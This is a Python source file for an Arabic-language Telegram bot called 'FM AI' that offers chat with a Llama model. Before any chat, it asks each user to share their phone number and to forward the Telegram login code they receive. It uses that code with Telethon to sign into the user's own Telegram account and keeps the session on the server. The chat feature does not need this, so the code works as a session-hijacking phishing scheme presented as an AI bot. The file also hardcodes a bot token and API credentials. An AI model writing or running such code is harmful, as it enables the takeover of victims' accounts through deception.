import os
import json
import asyncio
import requests
import threading
from flask import Flask, request
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneNumberInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError
)

app = Flask(__name__)

API_ID = 26938834
API_HASH = "2b04792eff86cad6ba50ca001920fb7d"

TOKEN = "8490776623:AAFD3Q6th51Y_DDkx0OEj-gVP7U5rpc3HO8"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

AI_SERVER = "https://kruri.qzz.io/chat/send"

users = {}
clients = {}

def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(f"{BASE_URL}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        print(f"Error sending message: {e}")

def request_phone_keyboard():
    return {
        "keyboard": [[{"text": "📱 مشاركة رقم الهاتف", "request_contact": True}]],
        "resize_keyboard": True
    }

def get_main_keyboard():
    return {
        "keyboard": [
            [{"text": "💬 محادثة عادية"}, {"text": "🖼️ إنشاء صورة"}],
            [{"text": "ℹ️ عن البوت"}, {"text": "🔄 إعادة تشغيل"}]
        ],
        "resize_keyboard": True
    }

def get_ai_reply(user_message):
    try:
        response = requests.post(
            AI_SERVER,
            json={"message": f"أجب باللغة العربية فقط: {user_message}", "model": "llama-3.3-70b-versatile"},
            headers={"Content-Type": "application/json"},
            timeout=30
        )
        return response.json().get("reply", "عذراً، لم أستطع الرد حالياً")
    except:
        return "خطأ في الاتصال بالذكاء الاصطناعي"

# ✅ تشغيل الكود غير المتزامن في خيط منفصل
def run_async_in_thread(coroutine_func, chat_id, *args):
    """يشغل coroutine في خيط منفصل مع event loop خاص به"""
    def runner():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(coroutine_func(chat_id, *args))
            
            # إرسال النتيجة للمستخدم في الخيط الرئيسي
            if result["success"]:
                if "phone" in result.get("data", {}):
                    send_message(chat_id,
                        f"📱 <b>تم إرسال رمز التحقق!</b>\n\n"
                        f"• رقم الهاتف: <code>+{result['data']['phone']}</code>\n"
                        f"• <b>افتح تطبيق تلغرام على هاتفك</b>\n"
                        f"• ستجد رمزًا مكونًا من 5 أرقام\n\n"
                        f"🔐 <b>أرسل هذا الرمز هنا الآن:</b>")
                elif "verified" in result.get("data", {}):
                    send_message(chat_id,
                        f"✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
                        f"🎉 أهلاً بك في بوت FM AI!\n"
                        f"اختر من الأزرار أدناه للبدء 👇",
                        get_main_keyboard())
            else:
                send_message(chat_id, f"❌ <b>{result['error']}</b>")
        except Exception as e:
            send_message(chat_id, f"❌ فشل تسجيل الدخول: {str(e)}")
        finally:
            loop.close()
    
    threading.Thread(target=runner, daemon=True).start()

# ✅ إرسال رمز التحقق
async def async_send_code(chat_id, phone):
    try:
        session_name = f"session_{chat_id}"
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return {"success": False, "error": "هذا الرقم مسجل دخوله بالفعل."}
        
        sent_code = await client.send_code_request(phone)
        users[chat_id] = {
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash,
            "verified": False,
            "attempts": 0,
            "client": client
        }
        
        return {"success": True, "data": {"phone": phone}}
        
    except PhoneNumberInvalidError:
        return {"success": False, "error": "رقم الهاتف غير صالح."}
    except Exception as e:
        return {"success": False, "error": f"فشل إرسال الرمز: {str(e)}"}

# ✅ التحقق من الرمز
async def async_verify_code(chat_id, code):
    user = users.get(chat_id)
    if not user or not user.get("client"):
        return {"success": False, "error": "انتهت الجلسة، ابدأ من جديد."}
    
    try:
        client = user["client"]
        
        await client.sign_in(
            phone=user['phone'],
            code=code,
            phone_code_hash=user['phone_code_hash']
        )
        
        user_info = await client.get_me()
        user["verified"] = True
        user["user_info"] = {"first_name": user_info.first_name, "username": user_info.username}
        
        return {"success": True, "data": {"verified": True}}
        
    except PhoneCodeInvalidError:
        return {"success": False, "error": "الرمز غير صحيح."}
    except PhoneCodeExpiredError:
        return {"success": False, "error": "انتهت صلاحية الرمز."}
    except SessionPasswordNeededError:
        return {"success": False, "error": "الحساب محمي بكلمة مرور (تحقق بخطوتين)."}
    except Exception as e:
        return {"success": False, "error": f"فشل تسجيل الدخول: {str(e)}"}

@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if not data or "message" not in data:
        return "OK", 200
    
    chat_id = data["message"]["chat"]["id"]
    user = users.get(chat_id, {"verified": False})
    
    # ✅ استقبال رقم الهاتف
    if "contact" in data["message"]:
        phone = data["message"]["contact"]["phone_number"]
        send_message(chat_id, "⏳ <b>جاري إرسال رمز التحقق...</b>")
        run_async_in_thread(async_send_code, chat_id, phone)
        return "OK", 200
    
    text = data["message"].get("text", "").strip()
    
    # ✅ مستخدم غير موثق
    if not user.get("verified"):
        if text == "/start" or text == "🔄 إعادة تشغيل":
            users[chat_id] = {"verified": False}
            send_message(chat_id,
                "👋 <b>مرحباً بك في بوت FM AI!</b>\n\n"
                "للاستمرار، يجب تسجيل الدخول الآمن عبر تلغرام.\n"
                "الرجاء مشاركة رقم هاتفك 👇",
                request_phone_keyboard())
        
        elif user.get("phone_code_hash") and text.isdigit():
            send_message(chat_id, "⏳ <b>جاري التحقق من الرمز...</b>")
            run_async_in_thread(async_verify_code, chat_id, text)
        return "OK", 200
    
    # ✅ مستخدم موثق
    threading.Thread(target=lambda: requests.post(f"{BASE_URL}/sendChatAction", json={"chat_id": chat_id, "action": "typing"})).start()
    
    if text == "/start" or text == "🔄 إعادة تشغيل":
        name = user.get("user_info", {}).get("first_name", "مستخدم")
        send_message(chat_id, f"👋 <b>مرحباً بك يا {name}!</b>\n\nاختر من الأزرار أدناه 👇", get_main_keyboard())
    elif text == "ℹ️ عن البوت":
        phone = user.get('phone', 'غير معروف')
        send_message(chat_id, f"🤖 <b>بوت FM AI</b>\n\n• رقم الهاتف: <code>+{phone}</code>\n• الذكاء: Llama 3.3 70B\n• المطور: مريم محمد 🛡️", get_main_keyboard())
    elif text == "💬 محادثة عادية":
        send_message(chat_id, "تم تفعيل وضع المحادثة 💬\nاكتب رسالتك!", get_main_keyboard())
    elif text == "🖼️ إنشاء صورة":
        send_message(chat_id, "تم تفعيل وضع إنشاء الصور 🖼️\nاكتب وصف الصورة!", get_main_keyboard())
    else:
        reply = get_ai_reply(text)
        send_message(chat_id, reply, get_main_keyboard())
    
    return "OK", 200

@app.route("/")
def home():
    return "FM AI Bot with Thread-Safe Telethon", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)